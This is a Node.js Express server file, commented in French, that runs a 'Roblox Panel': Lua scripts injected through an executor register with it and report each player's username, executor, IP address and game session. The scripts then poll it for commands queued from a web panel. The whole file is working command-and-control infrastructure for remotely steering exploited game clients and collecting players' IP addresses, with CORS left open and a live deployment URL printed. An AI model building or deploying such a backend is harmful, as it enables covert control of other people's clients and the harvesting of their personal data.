const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// CORS configuré pour accepter toutes les origines (important pour Roblox)
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'DELETE'],
    credentials: false
}));

app.use(express.json());
app.use(express.static('public'));

// Base de données en mémoire
const players = new Map();
const commands = new Map();

// API pour enregistrement et heartbeat
app.post('/api', (req, res) => {
    try {
        const { action, userid, username, executor, ip, game, gameId, jobId } = req.body;

        console.log('📥 Received:', { action, userid, username });

        if (action === 'register') {
            players.set(userid.toString(), {
                userid,
                username,
                executor,
                ip,
                game,
                gameId,
                jobId,
                lastSeen: Date.now(),
                status: 'online'
            });
            console.log(`✅ Player registered: ${username} (${userid})`);
            return res.json({ success: true, message: 'Registered successfully' });
        }

        if (action === 'heartbeat') {
            const player = players.get(userid.toString());
            if (player) {
                player.lastSeen = Date.now();
                player.status = 'online';
                return res.json({ success: true, message: 'Heartbeat received' });
            } else {
                return res.json({ success: false, message: 'Player not found' });
            }
        }

        res.json({ success: false, message: 'Invalid action' });
    } catch (error) {
        console.error('❌ Error in /api POST:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// API pour récupérer les commandes (polling du script Lua)
app.get('/api', (req, res) => {
    try {
        const { userid } = req.query;
        
        if (!userid) {
            return res.json({ error: 'No userid provided' });
        }

        const command = commands.get(userid.toString());
        
        if (command) {
            console.log(`📤 Sending command to ${userid}:`, command);
            commands.delete(userid.toString());
            return res.json(command);
        }

        res.json({ command: null });
    } catch (error) {
        console.error('❌ Error in /api GET:', error);
        res.status(500).json({ error: error.message });
    }
});

// API pour envoyer des commandes depuis le panel
app.post('/command', (req, res) => {
    try {
        const { userid, command, reason, assetId } = req.body;

        if (!userid || !command) {
            return res.status(400).json({ error: 'Missing userid or command' });
        }

        const commandData = { command };
        if (reason) commandData.reason = reason;
        if (assetId) commandData.assetId = assetId;

        commands.set(userid.toString(), commandData);
        console.log(`📤 Command sent to ${userid}: ${command}`);

        res.json({ success: true, message: `Command "${command}" queued for player ${userid}` });
    } catch (error) {
        console.error('❌ Error in /command:', error);
        res.status(500).json({ error: error.message });
    }
});

// API pour obtenir la liste des joueurs
app.get('/players', (req, res) => {
    try {
        const now = Date.now();
        const playerList = Array.from(players.values()).map(player => ({
            ...player,
            status: (now - player.lastSeen < 15000) ? 'online' : 'offline'
        }));
        res.json(playerList);
    } catch (error) {
        console.error('❌ Error in /players:', error);
        res.status(500).json({ error: error.message });
    }
});

// API pour supprimer un joueur
app.delete('/player/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        players.delete(userid);
        commands.delete(userid);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in DELETE /player:', error);
        res.status(500).json({ error: error.message });
    }
});

// Nettoyage automatique des joueurs inactifs
setInterval(() => {
    const now = Date.now();
    for (const [userid, player] of players.entries()) {
        if (now - player.lastSeen > 60000) {
            console.log(`🔴 Player timeout: ${player.username}`);
            players.delete(userid);
            commands.delete(userid);
        }
    }
}, 30000);

app.listen(PORT, () => {
    console.log(`🚀 Roblox Panel Server running on port ${PORT}`);
    console.log(`📡 Endpoint: http://localhost:${PORT}`);
    console.log(`📡 Railway Endpoint: https://robloxlol-production.up.railway.app/`);
    console.log(`\n⚠️  IMPORTANT: Update the SERVER_URL in your Lua script!`);
});